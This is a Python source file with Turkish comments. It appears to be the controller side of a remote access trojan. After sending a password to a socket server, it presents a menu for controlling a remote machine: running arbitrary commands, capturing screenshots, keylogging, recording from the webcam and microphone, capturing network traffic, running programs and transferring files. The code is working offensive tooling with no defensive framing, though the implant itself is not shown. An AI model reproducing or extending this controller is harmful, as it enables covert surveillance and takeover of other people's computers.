import socket
import os

SECRET_PASSWORD = "benimlabimsifresi"

# Yetkilendirme Fonksiyonu
def authenticate(server_socket):
    password = input("Enter password to connect: ")
    server_socket.send(password.encode())
    response = server_socket.recv(1024).decode()
    print(response)
    if response == "Authentication successful!":
        return True
    else:
        print("Authentication failed!")
        return False

# Komut Gönderme ve Cevap Alma
def send_command(server_socket, command):
    server_socket.send(command.encode())
    response = server_socket.recv(1024).decode()
    return response

# Ekran Görüntüsünü Al ve Kaydet
def save_screenshot(server_socket):
    with open("screenshot.png", "wb") as f:
        while True:
            data = server_socket.recv(1024)
            if not data:
                break
            f.write(data)
    print("Screenshot saved as screenshot.png")

def start_client():
    server_ip = "127.0.0.1"
    server_port = 9999

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    if authenticate(client_socket):
        while True:
            # Menü Gönderme
            print("\nChoose an option:")
            print("1. Execute Command")
            print("2. Screenshot")
            print("3. System Info")
            print("4. CPU Info")
            print("5. USB Devices")
            print("6. Monitor Connection Info")
            print("7. Network Traffic Capture")
            print("8. Keylogger")
            print("9. Webcam Capture")
            print("10. Run Program")
            print("11. View Logs")
            print("12. Start File Download/Upload")
            print("13. Microphone Capture")
            print("14. Close Application")
            print("15. Exit\n")

            option = input("> ")

            # Kullanıcı Seçimi
            client_socket.send(option.encode())

            if option == "1":
                command = input("Enter command to execute: ")
                result = send_command(client_socket, command)
                print(result)
            elif option == "2":
                print("Receiving screenshot...")
                save_screenshot(client_socket)
            elif option == "3":
                result = send_command(client_socket, "system_info")
                print(result)
            elif option == "4":
                result = send_command(client_socket, "cpu_info")
                print(result)
            elif option == "5":
                result = send_command(client_socket, "list_usb")
                print(result)
            elif option == "6":
                result = send_command(client_socket, "connection_info")
                print(result)
            elif option == "7":
                result = send_command(client_socket, "network_traffic")
                print(result)
            elif option == "8":
                result = send_command(client_socket, "keylogger")
                print(result)
            elif option == "9":
                result = send_command(client_socket, "webcam_capture")
                print(result)
            elif option == "10":
                result = send_command(client_socket, "run_program")
                print(result)
            elif option == "11":
                result = send_command(client_socket, "view_logs")
                print(result)
            elif option == "12":
                result = send_command(client_socket, "file_transfer")
                print(result)
            elif option == "13":
                result = send_command(client_socket, "microphone_capture")
                print(result)
            elif option == "14":
                result = send_command(client_socket, "close_application")
                print(result)
            elif option == "15":
                print("Exiting...")
                break

    client_socket.close()

if __name__ == "__main__":
    start_client()
